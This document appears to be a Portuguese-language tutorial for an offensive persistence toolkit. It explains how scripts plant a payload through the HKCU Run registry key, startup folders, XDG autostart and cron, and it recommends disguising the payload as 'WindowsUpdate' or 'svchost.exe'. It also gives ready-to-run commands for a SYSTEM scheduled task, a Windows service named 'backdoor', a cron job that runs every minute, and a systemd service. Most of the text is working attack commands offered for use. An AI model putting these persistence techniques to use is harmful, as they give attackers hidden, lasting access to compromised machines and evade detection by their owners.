# Persistence — Tutorial

## Dependencias
Apenas stdlib Python — sem pip necessario.

---

## reg_persist.py
Adiciona entrada no registro `HKCU\Run` — executa payload no login do usuario sem privilégio de admin.

```bash
python reg_persist.py
# 1. Add entry
# Name: WindowsUpdate
# Path: C:\Users\user\AppData\Roaming\payload.exe
```

**Verificar entrada criada:**
```bash
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

**Remover:**
```bash
python reg_persist.py
# 2. Remove entry
# Name: WindowsUpdate
```

Para persistencia elevada (todos os usuarios) use `HKLM\Run` — requer admin.

---

## startup_drop.py
Copia payload para pasta de startup do sistema operacional.

**Windows:**
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
```

**Linux (XDG + cron):**
```
~/.config/autostart/<name>.desktop
crontab: @reboot <payload>
```

```bash
python startup_drop.py
# Payload path: payload.exe
# Name: svchost.exe    <- nome convincente
```

**Verificar no Linux:**
```bash
crontab -l
cat ~/.config/autostart/svchost.desktop
```

---

## Outras tecnicas de persistencia (manual)

```bash
# Scheduled Task (Windows — sem arquivo na startup):
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM

# Servico Windows:
sc create backdoor binpath= "C:\payload.exe" start= auto
net start backdoor

# Linux — cron a cada minuto:
(crontab -l; echo "* * * * * /tmp/payload") | crontab -

# Linux — systemd service:
cat > /etc/systemd/system/backdoor.service <<EOF
[Service]
ExecStart=/tmp/payload
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
```
